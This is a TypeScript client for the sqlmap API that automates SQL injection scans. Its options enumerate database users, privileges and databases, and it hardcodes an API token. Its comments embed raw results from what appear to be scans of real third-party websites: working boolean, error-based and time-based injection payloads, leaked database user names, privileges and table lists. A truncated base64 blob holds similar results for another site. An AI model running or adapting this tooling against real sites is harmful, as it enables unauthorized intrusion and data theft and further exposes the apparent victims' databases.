/**
 * sqlmapapi SDK
 * 
 * 通过接口， 发送扫描任务
 */

import { Request } from '@/utils/request';
import Singleton from '@/utils/singleton';
import { ApiResult, ErrorCode } from '../type';

interface SqlmapTestParmater {
    url: string;   
}

export default class SqlmapSDK extends Singleton {
    private server = '';
    // private server = 'http://192.168.3.127:8775';
    private token = '478b1e9136bc32d01dcfcd2f44de87ee';

    constructor (api:string = '') {
        super();
        this.server = api;
    }

    /**
     * 快速开始扫描一个任务
     * @param url 
     * @returns 
     */
    public scanUrl(url:string, cb:((taskId:string, url: string)=>void) = ()=>{}):Promise<boolean> {
        let id:string;

        return this.createNewTask()
        .then(taskId => {
            id = taskId;
            cb(id, url);
            return this.setTaskOptions(taskId,{ url })
        })
        .then(setOk => {
            console.log(`[i]set task: %c${id} options, setOK ${setOk}`, 'color: green, font-weight: 600')
            if (setOk) {
                return this.startTargetScan(id);
            }
        })
    }

    /**
     * 创建一个任务
     * @get("/task/new") Create new task ID. 
     * @param url
     * @param options
     * {
            "success": true,
            "taskid": "5bd92b225dd48d9f"
        }
     */
    public createNewTask():Promise<string> {
        const api = '/task/new';
        return Request.get(`${this.server}${api}`).then((res:any) => {
            if (!res.success) {
                throw (`create new task fail`);
            }
            console.log(`[i]New Task was create: %c${res.taskid}`, 'color: green');
            return res.taskid;
        }).catch(err => {
            console.error(`[e]start sacn fail: %c${err}`, 'color: green');
        })
    }

    /**
     * 设置任务参数
     * @post("/option/<taskid>/set") Set an option (command line switch) for a certain task ID
     * @param options 
     * 
     {
        "success": true
     }
     */
    public setTaskOptions(taskId: string, options:SqlmapTestParmater):Promise<boolean> {
        const api = `/option/${taskId}/set`;
        return Request.post(`${this.server}${api}`, options).then((res: any) => {
            if (res.success) {
                return true;
            }
            return false;
        }).catch(err => {
            console.error(`[e]set task ${taskId} options fail`, err);
            return false;
        });
    }

    /**
     * 开始一个扫描
     * @post("/scan/<taskid>/start") Launch a scan
     * @param url 
     {"getCurrentUser": true,"randomAgent": true, "getPrivileges": true, "getCurrentDb": true, "isDba": true, "getDbs": true,"getCount":true}
     * 
     {
        "success": true,
        "engineid": 148
    }
     */
    public startTargetScan(taskId: string) {
        const api = `/scan/${taskId}/start`;
        const params = {
            "threads": 5,"getCurrentUser": true,
            "randomAgent": true, "getPrivileges": true, 
            "getCurrentDb": true, "isDba": true, 
            "getDbs": true,"getCount":true,
            "technique": "BEUSQ",
        };
        return Request.post(
            `${this.server}${api}`,
            params
            ).then((res: any) => {
            return res.taskid;
        }).catch(err => {
            console.log('[e]start sacn fail', err);
        })
    }

    /**
     * @get("/option/<taskid>/list") List options for a certain task ID
     */
    public getTargetOptions(taskId: string) {
        const api = `/option/${taskId}/list`;
        return Request.get(`${this.server}${api}`).then((res: any) => {
            if (!res.success) {
                throw (`get task:${taskId} options fail`);
            }
            console.log(`[i]getTargetOptions `, res);
            return res.options;
        }).catch(err => {
            console.error(`[e]start sacn fail: %c${err}`, 'color: green');
        })
    }

    /**
     * 获取扫描状态
     * @get("/scan/<taskid>/status") Return status of a scan
     * 
     {
        "success": true,
        "status": "running",
        "returncode": null
    }
     */
    public getScanStatus(taskId: string) {

    }

    /**
     * 获取任务结果
     * @get("/scan/<taskid>/data") Retrieve the data of a scan
     * 
        {
            "success": true,
            "data": [
                {
                    "status": 1,
                    "type": 0,
                    "value": {
                        "url": "http://www.pwmedtech.com:80/about.php",
                        "query": "bid=28",
                        "data": null
                    }
                },
                {
                    "status": 1,
                    "type": 1,
                    "value": [
                        {
                            "place": "GET",
                            "parameter": "bid",
                            "ptype": 1,
                            "prefix": "",
                            "suffix": "",
                            "clause": [
                                1,
                                8,
                                9
                            ],
                            "notes": [],
                            "data": {
                                "1": {
                                    "title": "AND boolean-based blind - WHERE or HAVING clause",
                                    "payload": "bid=28 AND 6367=6367",
                                    "where": 1,
                                    "vector": "AND [INFERENCE]",
                                    "comment": "",
                                    "templatePayload": null,
                                    "matchRatio": null,
                                    "trueCode": 200,
                                    "falseCode": 200
                                },
                                "2": {
                                    "title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                                    "payload": "bid=28 AND (SELECT 3565 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT (ELT(3565=3565,1))),0x716a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                                    "where": 1,
                                    "vector": "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                                    "comment": "",
                                    "templatePayload": null,
                                    "matchRatio": null,
                                    "trueCode": null,
                                    "falseCode": null
                                },
                                "5": {
                                    "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                                    "payload": "bid=28 AND (SELECT 3553 FROM (SELECT(SLEEP([SLEEPTIME])))NsCP)",
                                    "where": 1,
                                    "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
                                    "comment": "",
                                    "templatePayload": null,
                                    "matchRatio": null,
                                    "trueCode": 200,
                                    "falseCode": null
                                }
                            },
                            "conf": {
                                "textOnly": null,
                                "titles": null,
                                "code": null,
                                "string": "\u6587\u5316\u7406\u5ff5",
                                "notString": null,
                                "regexp": null,
                                "optimize": null
                            },
                            "dbms": "MySQL",
                            "dbms_version": [
                                ">= 5.0"
                            ],
                            "os": null
                        }
                    ]
                },
                {
                    "status": 1,
                    "type": 2,
                    "value": "back-end DBMS: MySQL >= 5.0"
                },
                {
                    "status": 1,
                    "type": 4,
                    "value": "qdm0010329@%"
                },
                {
                    "status": 1,
                    "type": 5,
                    "value": "qdm0010329_db"
                },
                {
                    "status": 1,
                    "type": 7,
                    "value": ""
                },
                {
                    "status": 1,
                    "type": 10,
                    "value": {
                        "'qdm0010329'@'%'": [
                            "USAGE"
                        ]
                    }
                },
                {
                    "status": 1,
                    "type": 12,
                    "value": [
                        "information_schema",
                        "qdm0010329_db"
                    ]
                },
                {
                    "status": 0,
                    "type": 13,
                    "value": "[06:24:40] [INFO] retrieved: 'information_schema'\n[06:24:41] [INFO] retrieved: 'information_schema'\n[06:24:41] [INFO] retrieved: 'information_schema'\n[06:24:41] [INFO] retrieved: 'information_schema'\n[06:24:41] [INFO] retrieved: 'information_schema'\n[06:24:41] [INFO] retrieved: 'CHARACTER_SETS'\n[06:24:41] [INFO] retrieved: 'COLLATIONS'\n[06:24:41] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'\n[06:24:42] [INFO] retrieved: 'COLUMN_PRIVILEGES'\n[06:24:42] [INFO] retrieved: 'COLUMNS'\n[06:24:42] [INFO] retrieved: 'information_schema'\n[06:24:43] [INFO] retrieved: 'information_schema'\n[06:24:43] [INFO] retrieved: 'information_schema'\n[06:24:43] [INFO] retrieved: 'information_schema'\n[06:24:43] [INFO] retrieved: 'information_schema'\n[06:24:44] [INFO] retrieved: 'ENGINES'\n[06:24:44] [INFO] retrieved: 'EVENTS'\n[06:24:44] [INFO] retrieved: 'FILES'\n[06:24:45] [INFO] retrieved: 'GLOBAL_STATUS'\n[06:24:45] [INFO] retrieved: 'GLOBAL_VARIABLES'\n[06:24:45] [INFO] retrieved: 'information_schema'\n[06:24:45] [INFO] retrieved: 'information_schema'\n[06:24:46] [INFO] retrieved: 'information_schema'\n[06:24:46] [INFO] retrieved: 'information_schema'\n[06:24:46] [INFO] retrieved: 'information_schema'\n[06:24:46] [INFO] retrieved: 'KEY_COLUMN_USAGE'\n[06:24:47] [INFO] retrieved: 'PARTITIONS'\n[06:24:47] [INFO] retrieved: 'PLUGINS'\n[06:24:47] [INFO] retrieved: 'PROCESSLIST'\n[06:24:48] [INFO] retrieved: 'PROFILING'\n[06:24:48] [INFO] retrieved: 'information_schema'\n[06:24:49] [INFO] retrieved: 'information_schema'\n[06:24:49] [INFO] retrieved: 'information_schema'\n[06:24:49] [INFO] retrieved: 'information_schema'\n[06:24:49] [INFO] retrieved: 'information_schema'\n[06:24:50] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'\n[06:24:50] [INFO] retrieved: 'ROUTINES'\n[06:24:50] [INFO] retrieved: 'SCHEMATA'\n[06:24:50] [INFO] retrieved: 'SCHEMA_PRIVILEGES'\n[06:24:51] [INFO] retrieved: 'SESSION_STATUS'\n[06:24:51] [INFO] retrieved: 'information_schema'\n[06:24:51] [INFO] retrieved: 'information_schema'\n[06:24:51] [INFO] retrieved: 'information_schema'\n[06:24:51] [INFO] retrieved: 'information_schema'\n[06:24:52] [INFO] retrieved: 'information_schema'\n[06:24:52] [INFO] retrieved: 'SESSION_VARIABLES'\n[06:24:52] [INFO] retrieved: 'STATISTICS'\n[06:24:52] [INFO] retrieved: 'TABLES'\n[06:24:52] [INFO] retrieved: 'TABLE_CONSTRAINTS'\n[06:24:53] [INFO] retrieved: 'TABLE_PRIVILEGES'\n[06:24:53] [INFO] retrieved: 'information_schema'\n[06:24:53] [INFO] retrieved: 'information_schema'\n[06:24:54] [INFO] retrieved: 'information_schema'\n[06:24:54] [INFO] retrieved: 'qdm0010329_db'\n[06:24:55] [INFO] retrieved: 'qdm0010329_db'\n[06:24:55] [INFO] retrieved: 'TRIGGERS'\n[06:24:55] [INFO] retrieved: 'USER_PRIVILEGES'\n[06:24:55] [INFO] retrieved: 'VIEWS'\n[06:24:55] [INFO] retrieved: 'communication_v'\n[06:24:56] [INFO] retrieved: 'deinfo'\n[06:24:56] [INFO] retrieved: 'qdm0010329_db'\n[06:24:56] [INFO] retrieved: 'qdm0010329_db'\n[06:24:57] [INFO] retrieved: 'qdm0010329_db'\n[06:24:57] [INFO] retrieved: 'qdm0010329_db'\n[06:24:57] [INFO] retrieved: 'qdm0010329_db'\n[06:24:57] [INFO] retrieved: 'engdeinfo'\n[06:24:58] [INFO] retrieved: 'englink'\n[06:24:58] [INFO] retrieved: 'engnavigation'\n[06:24:58] [INFO] retrieved: 'engnews'\n[06:24:58] [INFO] retrieved: 'engp_huanbao'\n[06:24:58] [INFO] retrieved: 'qdm0010329_db'\n[06:24:58] [INFO] retrieved: 'qdm0010329_db'\n[06:24:59] [INFO] retrieved: 'qdm0010329_db'\n[06:24:59] [INFO] retrieved: 'qdm0010329_db'\n[06:24:59] [INFO] retrieved: 'qdm0010329_db'\n[06:24:59] [INFO] retrieved: 'engsiteconfigszt'\n[06:24:59] [INFO] retrieved: 'link'\n[06:25:00] [INFO] retrieved: 'message'\n[06:25:00] [INFO] retrieved: 'navigation'\n[06:25:00] [INFO] retrieved: 'news'\n[06:25:00] [INFO] retrieved: 'qdm0010329_db'\n[06:25:01] [INFO] retrieved: 'qdm0010329_db'\n[06:25:01] [INFO] retrieved: 'qdm0010329_db'\n[06:25:01] [INFO] retrieved: 'qdm0010329_db'\n[06:25:01] [INFO] retrieved: 'qdm0010329_db'\n[06:25:01] [INFO] retrieved: 'p_huanbao'\n[06:25:01] [INFO] retrieved: 'pfasbd_d'\n[06:25:02] [INFO] retrieved: 'siteconfigszt'\n[06:25:02] [INFO] retrieved: 'zt_log_manage'\n[06:25:02] [INFO] retrieved: 'zt_super'\n"
                },
                {
                    "status": 1,
                    "type": 16,
                    "value": {
                        "information_schema": {
                            "6": [
                                "PLUGINS"
                            ],
                            "45": [
                                "PARTITIONS",
                                "TABLES"
                            ],
                            "268": [
                                "SESSION_STATUS",
                                "GLOBAL_STATUS"
                            ],
                            "17": [
                                "STATISTICS",
                                "KEY_COLUMN_USAGE",
                                "TABLE_CONSTRAINTS"
                            ],
                            "563": [
                                "COLUMNS"
                            ],
                            "274": [
                                "GLOBAL_VARIABLES",
                                "SESSION_VARIABLES"
                            ],
                            "128": [
                                "COLLATION_CHARACTER_SET_APPLICABILITY"
                            ],
                            "18": [
                                "SCHEMA_PRIVILEGES"
                            ],
                            "36": [
                                "CHARACTER_SETS"
                            ],
                            "2": [
                                "SCHEMATA"
                            ],
                            "5": [
                                "ENGINES"
                            ],
                            "1": [
                                "USER_PRIVILEGES",
                                "PROCESSLIST"
                            ],
                            "127": [
                                "COLLATIONS"
                            ]
                        },
                        "qdm0010329_db": {
                            "5": [
                                "engp_huanbao",
                                "p_huanbao"
                            ],
                            "20": [
                                "deinfo"
                            ],
                            "2": [
                                "message",
                                "link",
                                "englink"
                            ],
                            "19": [
                                "engdeinfo"
                            ],
                            "46": [
                                "navigation"
                            ],
                            "553": [
                                "news"
                            ],
                            "1": [
                                "siteconfigszt",
                                "engsiteconfigszt"
                            ],
                            "44": [
                                "engnavigation"
                            ],
                            "461": [
                                "engnews"
                            ],
                            "11": [
                                "zt_log_manage"
                            ],
                            "3": [
                                "zt_super"
                            ]
                        }
                    }
                }
            ],
            "error": []
        }
     */
    public getReuslt(taskId: string) {
        const api = `/scan/${taskId}/data`;
        return Request.get(`${this.server}${api}`).then((res: any) => {
            if (!res.success) {
                throw (`get scan data:${taskId} options fail`);
            }
            console.log(`[i]getReuslt `, res);
            return res.data;
        }).catch(err => {
            console.error(`[e]getReuslt fail: %c${err}`, 'color: green');
        })
    }

    /**
     * 删除任务
     * @get("/task/<taskid>/delete") Delete own task ID. 
     * @param taskId 
     */
    public delTask(taskId: string) {

    }

    /**
     * 停止一个扫描
     * @get("/scan/<taskid>/stop") Kill a scan
     * @param taskId 
     */
    public stopScan(taskId: string) {

    }

    /**
     * 
     * @get("/admin/list") List task pull
     * 
     {
        "success": true,
        "tasks": {
            "5bd92b225dd48d9f": "running"
        },
        "tasks_num": 1
    }
     */
    public getAllTaskList ():Promise<ApiResult> {

        // 该接口， 最先调用，所有无需每个方法检测， 这个检测即可
        if (this.server === '') {
            return new Promise((resolve) => {
                resolve({success: false, code: ErrorCode.SQLMAPIAPI_NOT_CONFIG});
            });
        }

        const api = `/admin/list`;
        return Request.get(`${this.server}${api}`).then((res: any) => {
            if (!res.success) {
                console.error(`get all task list fail`);
            }
            return {success: true, data: res.tasks};
        }).catch(err => {
            console.error(`[e]getAllTaskList: %c${err}`, 'color: green');
            return {success: false, code: ErrorCode.FETCH_FAIL};
        })
    }

    /**
     * 不传参数删除所有任务， 传参数删除对应任务
     * @get("/admin/<taskid>/flush") Flush task spool (delete all tasks). 
     */
    public cleanTasks(taskId?: string) {
        const api = taskId ? `/admin/${taskId}/flush` : '/admin/flush';
    }

    /**
     * 下载数据
     * @param taskId    任务id
     * @param target    目录为hostname
     * @param file      下载的文件名字
     * @returns  结果为 base64 编码
     * 
     {
        "success": true,
        "file": "eyd1cmwnOiAnaHR0cHM6Ly93d3cuYWFrYXJib29rcy5jb206NDQzL2RldGFpbHMucGhwJywgJ3F1ZXJ5JzogJ2JpZD04NjMnLCAnZGF0YSc6IE5vbmV9Cjogeyd1cmwnOiAnaHR0cHM6Ly93d3cuYWFrYXJib29rcy5jb206NDQzL2RldGFpbHMucGhwJywgJ3F1ZXJ5JzogJ2JpZD04NjMnLCAnZGF0YSc6IE5vbmV9Clt7J3BsYWNlJzogJ0dFVCcsICdwYXJhbWV0ZXInOiAnYmlkJywgJ3B0eXBlJzogMiwgJ3ByZWZpeCc6ICInIiwgJ3N1ZmZpeCc6ICIgQU5EICdbUkFORFNUUl0nPSdbUkFORFNUUl0iLCAnY2xhdXNlJzogWzEsIDgsIDldLCAnbm90ZXMnOiBbXSwgJ2RhdGEnOiB7MTogeyd0aXRsZSc6ICdBTkQgYm9vbGVhbi1iYXNlZCBibGluZCAtIFdIRVJFIG9yIEhBVklORyBjbGF1c2UnLCAncGF5bG9hZCc6ICJiaWQ9ODYzJyBBTkQgNTkwMD01OTAwIEFORCAnRXNYUyc9J0VzWFMiLCAnd2hlcmUnOiAxLCAndmVjdG9yJzogJ0FORCBbSU5GRVJFTkNFXScsICdjb21tZW50JzogJycsICd0ZW1wbGF0ZVBheWxvYWQnOiBOb25lLCAnbWF0Y2hSYXRpbyc6IDAuOTE1LCAndHJ1ZUNvZGUnOiAyMDAsICdmYWxzZUNvZGUnOiAyMDB9LCA2OiB7J3RpdGxlJzogJ0dlbmVyaWMgVU5JT04gcXVlcnkgKE5VTEwpIC0gMSB0byAyMCBjb2x1bW5zJywgJ3BheWxvYWQnOiAiYmlkPS0zNzEwJyBVTklPTiBBTEwgU0VMRUNUIENPTkNBVCgweDcxNzY2MjZhNzEsMHg0NDQzNDg2MTU0NjQ3YTc2NzA3NDY3NTM0NTRlNGI0MjQyNGU3NzQ4NmQ2ZTcyNDc0ZjcxNDY2MjRlNzE2ODQzNzQ2ODUyNzE2NjUxNGI0YywweDcxNmI3NjcxNzEpLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTC0tIC0iLCAnd2hlcmUnOiAyLCAndmVjdG9yJzogKDAsIDI0LCAnW0dFTkVSSUNfU1FMX0NPTU1FTlRdJywgIiciLCAiIEFORCAnW1JBTkRTVFJdJz0nW1JBTkRTVFJdIiwgJ05VTEwnLCAyLCBGYWxzZSwgTm9uZSwgTm9uZSwgTm9uZSksICdjb21tZW50JzogJ1tHRU5FUklDX1NRTF9DT01NRU5UXScsICd0ZW1wbGF0ZVBheWxvYWQnOiBOb25lLCAnbWF0Y2hSYXRpbyc6IDAuOTE1LCAndHJ1ZUNvZGUnOiBOb25lLCAnZmFsc2VDb2RlJzogTm9uZX19LCAnY29uZic6IHsndGV4dE9ubHknOiBOb25lLCAndGl0bGVzJzogTm9uZSwgJ2NvZGUnOiBOb25lLCAnc3RyaW5nJzogJ1NleCcsICdub3RTdHJpbmcnOiBOb25lLCAncmVnZXhwJzogTm9uZSwgJ29wdGltaXplJzogTm9uZX0sICdkYm1zJzogTm9uZSwgJ2RibXNfdmVyc2lvbic6IE5vbmUsICdvcyc6IE5vbmV9XQo6IHsncGxhY2UnOiAnR0VUJywgJ3BhcmFtZXRlcic6ICdiaWQnLCAncHR5cGUnOiAyLCAncHJlZml4JzogIiciLCAnc3VmZml4JzogIiBBTkQgJ1tSQU5EU1RSXSc9J1tSQU5EU1RSXSIsICdjbGF1c2UnOiBbMSwgOCwgOV0sICdub3Rlcyc6IFtdLCAnZGF0YSc6IHsxOiB7J3RpdGxlJzogJ0FORCBib29sZWFuLWJhc2VkIGJsaW5kIC0gV0hFUkUgb3IgSEFWSU5HIGNsYXVzZScsICdwYXlsb2FkJzogImJpZD04NjMnIEFORCA1OTAwPTU5MDAgQU5EICdFc1hTJz0nRXNYUyIsICd3aGVyZSc6IDEsICd2ZWN0b3InOiAnQU5EIFtJTkZFUkVOQ0VdJywgJ2NvbW1lbnQnOiAnJywgJ3RlbXBsYXRlUGF5bG9hZCc6IE5vbmUsICdtYXRjaFJhdGlvJzogMC45MTUsICd0cnVlQ29kZSc6IDIwMCwgJ2ZhbHNlQ29kZSc6IDIwMH0sIDY6IHsndGl0bGUnOiAnR2VuZXJpYyBVTklPTiBxdWVyeSAoTlVMTCkgLSAxIHRvIDIwIGNvbHVtbnMnLCAncGF5bG9hZCc6ICJiaWQ9LTM3MTAnIFVOSU9OIEFMTCBTRUxFQ1QgQ09OQ0FUKDB4NzE3NjYyNmE3MSwweDQ0NDM0ODYxNTQ2NDdhNzY3MDc0Njc1MzQ1NGU0YjQyNDI0ZTc3NDg2ZDZlNzI0NzRmNzE0NjYyNGU3MTY4NDM3NDY4NTI3MTY2NTE0YjRjLDB4NzE2Yjc2NzE3MSksTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLSIsICd3aGVyZSc6IDIsICd2ZWN0b3InOiAoMCwgMjQsICdbR0VORVJJQ19TUUxfQ09NTUVOVF0nLCAiJyIsICIgQU5EICdbUkFORFNUUl0nPSdbUkFORFNUUl0iLCAnTlVMTCcsIDIsIEZhbHNlLCBOb25lLCBOb25lLCBOb25lKSwgJ2NvbW1lbnQnOiAnW0dFTkVSSUNfU1FMX0NPTU1FTlRdJywgJ3RlbXBsYXRlUGF5bG9hZCc6IE5vbmUsICdtYXRjaFJhdGlvJzogMC45MTUsICd0cnVlQ29kZSc6IE5vbmUsICdmYWxzZUNvZGUnOiBOb25lfX0sICdjb25mJzogeyd0ZXh0T25seSc6IE5vbmUsICd0aXRsZXMnOiBOb25lLCAnY29kZSc6IE5vbmUsICdzdHJpbmcnOiAnU2V4JywgJ25vdFN0cmluZyc6IE5vbmUsICdyZWdleHAnOiBOb25lLCAnb3B0aW1pemUnOiBOb25lfSwgJ2RibXMnOiBOb25lLCAnZGJtc192ZXJzaW9uJzogTm9uZSwgJ29zJzogTm9uZX0KYmFjay1lbmQgREJNUzogTXlTUUwgPj0gNS4wLjAKYm9va3NfcmFodWxAbG9jYWxob3N0CmN1cnJlbnQgdXNlcjogJ2Jvb2tzX3JhaHVsQGxvY2FsaG9zdCcKYWFrYXJib29rX2FtaXRyYWh1bApjdXJyZW50IGRhdGFiYXNlOiAnYWFrYXJib29rX2FtaXRyYWh1bCcKRmFsc2UKY3VycmVudCB1c2VyIGlzIERCQTogRmFsc2UKeyInYm9va3NfcmFodWwnQCdsb2NhbGhvc3QnIjogWydVU0FHRSddfQpkYXRhYmFzZSBtYW5hZ2VtZW50IHN5c3RlbSB1c2VycyBwcml2aWxlZ2VzOgpbKl0gJ2Jvb2tzX3JhaHVsJ0AnbG9jYWxob3N0JyBbMV06CiAgICBwcml2aWxlZ2U6IFVTQUdFCgpbJ2Fha2FyYm9va19hbWl0cmFodWwnLCAnaW5mb3JtYXRpb25fc2NoZW1hJ10KYXZhaWxhYmxlIGRhdGFiYXNlcyBbMl06ClsqXSBhYWthcmJvb2tfYW1pdHJhaHVsClsqXSBpbmZvcm1hdGlvbl9zY2hlbWEKCnsnaW5mb3JtYXRpb25fc2NoZW1hJzogezE6IFsnVVNFUl9QUklWSUxFR0VTJywgJ1BST0NFU1NMSVNUJ10sIDM0NzogWydTRVNTSU9OX1NUQVRVUycsICdHTE9CQUxfU1RBVFVTJ10sIDI4OiBbJ1RBQkxFX0NPTlNUUkFJTlRTJywgJ1NUQVRJU1RJQ1MnLCAnS0VZX0NPTFVNTl9VU0FHRSddLCA0NTU6IFsnU0VTU0lPTl9WQVJJQUJMRVMnXSwgNDA6IFsnQ0hBUkFDVEVSX1NFVFMnXSwgNDQxOiBbJ0dMT0JBTF9WQVJJQUJMRVMnXSwgMjogWydTQ0hFTUFUQSddLCAxODogWydTQ0hFTUFfUFJJVklMRUdFUyddLCAzNjogWydJTk5PREJfRlRfREVGQVVMVF9TVE9QV09SRCddLCA4NzogWydQQVJUSVRJT05TJywgJ1RBQkxFUyddLCA4MDc6IFsnQ09MVU1OUyddLCAyMTk6IFsnQ09MTEFUSU9OX0NIQVJBQ1RFUl9TRVRfQVBQTElDQUJJTElUWScsICdDT0xMQVRJT05TJ10sIDQyOiBbJ1BMVUdJTlMnXSwgOTogWydFTkdJTkVTJ119LCAnYWFrYXJib29rX2FtaXRyYWh1bCc6IHsxOTExOiBbJ2Jvb2tfY2F0ZWdvcnknXSwgNTE3OiBbJ2N1c3RvbWVyX2RldGFpbHMnXSwgNTE2OiBbJ2N1c3RvbWVyX2JpbGxfZGV0YWlscyddLCAxOiBbJ2Rpc2NvdW50JywgJ3Nob3Bfc2VydmljZScsICd0ZXJtc19jb25kaXRpb25zJ10sIDcwMTogWydhdXRob3InXSwgNDogWydob21lX29mZmVyJywgJ2F3YXJkJywgJ3NsaWRlciddLCAzNzogWydjb3Vwb24nXSwgMTYzNjogWydnYXRld2F5X29yZGVyX2RhdGFpbCddLCA2Mjk6IFsnbmV3X29yZGVyX2RhdGFpbCddLCAxNTM2OiBbJ2dhdGV3YXlfb3JkZXInXSwgMzogWydgbGFuZ3VhZ2VgJ10sIDEzMTM6IFsnYm9va19hdXRob3InXSwgMjogWydiaW5kaW5nJywgJ3JlZ2lvbicsICdhZG1pbiddLCA0Nzg6IFsnc291bmRfY291bnRyeSddLCA2OiBbJ2V2ZW50J10sIDkzNjogWydjdXN0b21lciddLCAyNzogWydjYXRhbG9nX2NhdGVnb3J5J10sIDUwOiBbJ2N1cG9uX2N1c3RvbWVyJ10sIDMyODogWyduZXdfb3JkZXInXSwgMTAwNzogWydib29rcyddfX0KRGF0YWJhc2U6IGluZm9ybWF0aW9uX3NjaGVtYQorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKy0tLS0tLS0tLSsKfCBUYWJsZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgRW50cmllcyB8CistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tKwp8IENPTFVNTlMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCA4MDcgICAgIHwKfCBTRVNTSU9OX1ZBUklBQkxFUyAgICAgICAgICAgICAgICAgICAgIHwgNDU1ICAgICB8CnwgR0xPQkFMX1ZBUklBQkxFUyAgICAgICAgICAgICAgICAgICAgICB8IDQ0MSAgICAgfAp8IEdMT0JBTF9TVEFUVVMgICAgICAgICAgICAgICAgICAgICAgICAgfCAzNDcgICAgIHwKfCBTRVNTSU9OX1NUQVRVUyAgICAgICAgICAgICAgICAgICAgICAgIHwgMzQ3ICAgICB8CnwgQ09MTEFUSU9OX0NIQVJBQ1RFUl9TRVRfQVBQTElDQUJJTElUWSB8IDIxOSAgICAgfAp8IENPTExBVElPTlMgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAyMTkgICAgIHwKfCBQQVJUSVRJT05TICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgODcgICAgICB8CnwgVEFCTEVTICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDg3ICAgICAgfAp8IFBMVUdJTlMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCA0MiAgICAgIHwKfCBDSEFSQUNURVJfU0VUUyAgICAgICAgICAgICAgICAgICAgICAgIHwgNDAgICAgICB8CnwgSU5OT0RCX0ZUX0RFRkFVTFRfU1RPUFdPUkQgICAgICAgICAgICB8IDM2ICAgICAgfAp8IEtFWV9DT0xVTU5fVVNBR0UgICAgICAgICAgICAgICAgICAgICAgfCAyOCAgICAgIHwKfCBTVEFUSVNUSUNTICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgMjggICAgICB8CnwgVEFCTEVfQ09OU1RSQUlOVFMgICAgICAgICAgICAgICAgICAgICB8IDI4ICAgICAgfAp8IFNDSEVNQV9QUklWSUxFR0VTICAgICAgICAgICAgICAgICAgICAgfCAxOCAgICAgIHwKfCBFTkdJTkVTICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgOSAgICAgICB8CnwgU0NIRU1BVEEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDIgICAgICAgfAp8IFBST0NFU1NMSVNUICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAxICAgICAgIHwKfCBVU0VSX1BSSVZJTEVHRVMgICAgICAgICAgICAgICAgICAgICAgIHwgMSAgICAgICB8CistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rLS0tLS0tLS0tKwoKRGF0YWJhc2U6IGFha2FyYm9va19hbWl0cmFodWwKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0rCnwgVGFibGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IEVudHJpZXMgfAorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKy0tLS0tLS0tLSsKfCBib29rX2NhdGVnb3J5ICAgICAgICAgICAgICAgICAgICAgICAgIHwgMTkxMSAgICB8CnwgZ2F0ZXdheV9vcmRlcl9kYXRhaWwgICAgICAgICAgICAgICAgICB8IDE2MzYgICAgfAp8IGdhdGV3YXlfb3JkZXIgICAgICAgICAgICAgICAgICAgICAgICAgfCAxNTM2ICAgIHwKfCBib29rX2F1dGhvciAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgMTMxMyAgICB8CnwgYm9va3MgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDEwMDcgICAgfAp8IGN1c3RvbWVyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCA5MzYgICAgIHwKfCBhdXRob3IgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgNzAxICAgICB8CnwgbmV3X29yZGVyX2RhdGFpbCAgICAgICAgICAgICAgICAgICAgICB8IDYyOSAgICAgfAp8IGN1c3RvbWVyX2RldGFpbHMgICAgICAgICAgICAgICAgICAgICAgfCA1MTcgICAgIHwKfCBjdXN0b21lcl9iaWxsX2RldGFpbHMgICAgICAgICAgICAgICAgIHwgNTE2ICAgICB8Cnwgc291bmRfY291bnRyeSAgICAgICAgICAgICAgICAgICAgICAgICB8IDQ3OCAgICAgfAp8IG5ld19vcmRlciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAzMjggICAgIHwKfCBjdXBvbl9jdXN0b21lciAgICAgICAgICAgICAgICAgICAgICAgIHwgNTAgICAgICB8CnwgY291cG9uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC